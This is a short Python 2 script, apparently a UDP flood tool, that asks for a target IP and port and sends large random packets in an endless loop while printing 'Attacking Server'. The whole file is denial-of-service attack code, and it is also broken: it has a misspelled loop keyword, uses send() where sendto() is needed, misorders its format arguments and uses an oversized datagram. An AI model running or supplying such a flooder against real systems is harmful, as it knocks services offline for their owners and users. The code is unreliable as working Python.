import socket
import random
import os
import time

target=raw_input("IP target :")
port = input (" port :")
time.sleep(1.4)

s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(75000)
sent= 6000
white True:
  s.send(bytes,(target,port))
  print" Attacking Server %s On port %s Socket size %s "% (sent,target,port)